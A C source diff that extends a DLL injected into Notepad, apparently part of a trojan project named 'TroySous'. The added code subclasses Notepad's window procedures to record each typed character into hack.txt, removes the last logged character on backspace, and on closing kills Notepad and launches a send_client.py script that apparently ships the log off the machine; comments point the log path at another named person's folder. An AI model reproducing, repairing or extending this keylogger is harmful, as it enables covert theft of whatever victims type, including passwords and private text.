@@ -3,10 +3,11 @@
 #include <stdio.h>
 #include <string.h>
 
-LONG_PTR previous_func = NULL;
-int i = -1;
-//char dest[] = "Hello this is ethan i hack you! LOL";
 
+
+LONG_PTR previous_func_child = NULL;
+LONG_PTR previous_func_parent = NULL;
+//char dest[] = "Hello this is ethan i hack you! LOL";
 
 
 char* read_line(char *str, int n, FILE *stream)
@@ -20,7 +21,6 @@ char* read_line(char *str, int n, FILE *stream)
 }
 
 void file2buffer(char *dest) {
-
 	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
 	read_line(dest, 40, fp);
 }
@@ -28,21 +28,22 @@ void file2buffer(char *dest) {
 
 void char2file(char c) {
 	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");
+	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "a+");
 	const char* write_format = "%c";
-	/*if (c == 8) {
-		fseek(fp, i-1, SEEK_CUR);
-		fprintf(fp, write_format, " ");
-		fseek(fp, i, SEEK_CUR);
-	}*/
-	
 	
 	fprintf(fp, write_format, c);
-	i++;
 	fclose(fp);
 
 }
 
+void end_writting() {
+	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "a+");
+	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");
 
+	const char* write_format = "%s";
+	fprintf(fp, write_format, "\n--------------------\n");
+	fclose(fp);
+}
 LRESULT CALLBACK WindowProcParent(
 	_In_ HWND   hwnd,
 	_In_ UINT   uMsg,
@@ -52,15 +53,44 @@ LRESULT CALLBACK WindowProcParent(
 	switch (uMsg)
 	{
 	case WM_CLOSE:
+		CallWindowProcA(previous_func_parent, hwnd, uMsg, wParam, lParam);
 		WinExec("taskkill /IM \"notepad.exe\" /F", SW_HIDE);
-		system("start pythonw C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\send_client.pyw");
-	
+		end_writting();
+		system("start pythonw C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\send_client.py");
+		//system("C:\\Users\\Elie Barkate\\Documents\\send_client.py");
+
 	default:
-		return DefWindowProc(hwnd, uMsg, wParam, lParam);
+		return CallWindowProcA(previous_func_parent, hwnd, uMsg, wParam, lParam);
 	}
 	return 0;
 }
 
+
+
+void delete_last_char() {
+#pragma region Copy file with delete
+	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
+	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "r");
+	char copied[10000];
+	int i = 0;
+	char c = fgetc(fp);
+	while (c != EOF)
+	{
+		copied[i] = c;
+		i++;
+		c = fgetc(fp);
+	}
+	copied[i] = '\0';
+	int length = strlen(copied);
+	copied[length - 1] = '\0';
+	fclose(fp);
+#pragma endregion
+	FILE *fp2 = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "w");
+	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "w");
+	fputs(copied,fp2);
+	fclose(fp2);
+
+}
 
 LRESULT CALLBACK WindowProcChild(
 	_In_ HWND   hwnd,
@@ -94,19 +124,23 @@ LRESULT CALLBACK WindowProcChild(
 			char2file(wParam);
 			wParam = 13;
 		}
+		else if (wParam == 8) {
+			delete_last_char();
+		}
 		else
 			char2file(wParam);
 	}
 	
-	return CallWindowProcA(previous_func , hwnd, uMsg, wParam, lParam);
+	return CallWindowProcA(previous_func_child , hwnd, uMsg, wParam, lParam);
 }
 
 void fuckwindow() {
 	HWND hparent = FindWindowExA(NULL,NULL, "Notepad", NULL );
+	previous_func_parent = GetWindowLongPtrA(hparent, GWLP_WNDPROC);
 	SetWindowLongPtrA(hparent, GWLP_WNDPROC, (LONG_PTR)WindowProcParent);
+
 	HWND hedit = FindWindowExA(hparent,NULL,"Edit",NULL);
-	previous_func = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
-	//MessageBoxW(NULL, L"2", L"myDLL", MB_OKCANCEL);
+	previous_func_child = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
 	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProcChild);
 }
 
